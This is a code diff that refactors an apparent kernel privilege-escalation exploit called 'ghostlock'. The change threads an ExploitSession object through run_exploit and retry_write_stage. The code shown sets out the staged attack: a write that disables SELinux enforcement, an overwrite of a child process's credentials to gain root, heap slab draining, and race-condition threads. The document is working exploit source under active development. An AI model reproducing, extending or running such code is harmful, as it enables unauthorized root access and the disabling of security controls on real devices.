@@ -1164,6 +1164,7 @@ typedef int (*write_stage_verify_fn)(void *context);
  * StageStatus. Future: exploit_stage_run(), while route execution remains
  * single-attempt and route-neutral. */
 static int retry_write_stage(
+        ghostlock::ExploitSession &session,
         const char *stage, uintptr_t target, int mode, int attempts,
         useconds_t settle_usec, write_stage_verify_fn verify, void *context,
         int leaf) {
@@ -1221,9 +1222,9 @@ static int retry_write_stage(
                                 &g_resolved_addresses)) + 8,
                     WriteMode::Zero, 1);
             pr_info("W2b: firing prebuilt init_cred+8 repair\n");
-            atomic_store(&ghostlock::g_exploit_session.race.fast_repair, 1);
+            atomic_store(&session.race.fast_repair, 1);
             int repaired = run_main_route_threads(&repair_request);
-            atomic_store(&ghostlock::g_exploit_session.race.fast_repair, 0);
+            atomic_store(&session.race.fast_repair, 0);
             if (!repaired) {
                 pr_warning("W2 fast repair route failed\n");
                 return 0;
@@ -1335,7 +1336,7 @@ static int verify_leaf_dir_stage(void *context) {
  * argv/environment snapshot; output: stable process exit code. Future:
  * exploit_session_run(ExploitSession *), delegating profile, heap, race, route,
  * victim and cleanup responsibilities to their contexts. */
-int run_exploit(int argc, char **argv) {
+int run_exploit(ghostlock::ExploitSession &session, int argc, char **argv) {
     heap_context_init(&g_heap_context);
     const char *profile_path = NULL;
     for (int i = 1; i < argc; i++) {
@@ -1399,6 +1400,7 @@ int run_exploit(int argc, char **argv) {
                 !runtime_config_snapshot().multicast_resident_enabled)
             w1_attempts = 1; /* one-shot route cannot safely retry a missed W1 */
         selinux_ok = retry_write_stage(
+                session,
                 "W1: SELinux",
                 resolved_addresses_data_alias(&g_resolved_addresses, SELINUX_ENFORCING),
                 1, w1_attempts,
@@ -1469,15 +1471,18 @@ int run_exploit(int argc, char **argv) {
     slab_drain();
     TIMER("pre-W2 drain");
 
-    ghostlock::VictimContext pipes;
+    /* SESSION-02: the victim protocol pipes are owned by the session; this
+     * reference keeps the W2/W3 stage code unchanged. */
+    ghostlock::VictimContext &pipes = session.victim;
     struct w2_stage_context w2_context = {.pipes = &pipes};
     pid_t child = -1;
     uintptr_t child_task = 0;
     int child_alive = 1;
     int seccomp_ok = 0;
     int ever_rooted = 0;
-    pid_t parked_child = -1;
-    ghostlock::UniqueFd parked_cmd_w;
+    /* SESSION-02: parked handoff state is owned by the session. */
+    pid_t &parked_child = session.parked_victim;
+    ghostlock::UniqueFd &parked_cmd_w = session.parked_victim_cmd;
 
     /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
      * child, so respawn and redo. */
@@ -1580,6 +1585,7 @@ int run_exploit(int argc, char **argv) {
 #endif
 
         int got_root = retry_write_stage(
+                session,
                 "W2: cred", child_task + TASK_CRED_OFF, 2,
                 (int) execution_settings()->w2_attempts,
                 execution_settings()->w2_settle_us,
@@ -1616,6 +1622,7 @@ int run_exploit(int argc, char **argv) {
         };
         if (!tcp_writes) {
             int dir_ok = retry_write_stage(
+                    session,
                     "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
                     verify_leaf_dir_stage, &w3_context, 1);
             if (!dir_ok) {
@@ -1741,5 +1748,5 @@ int run_exploit(int argc, char **argv) {
 /* Decoupling plan: native executable adapter. Inputs: argc/argv; output: stable
  * exit code. Future: remain a thin adapter around ExploitSession lifecycle. */
 int main(int argc, char **argv) {
-    return run_exploit(argc, argv);
+    return run_exploit(ghostlock::g_exploit_session, argc, argv);
 }
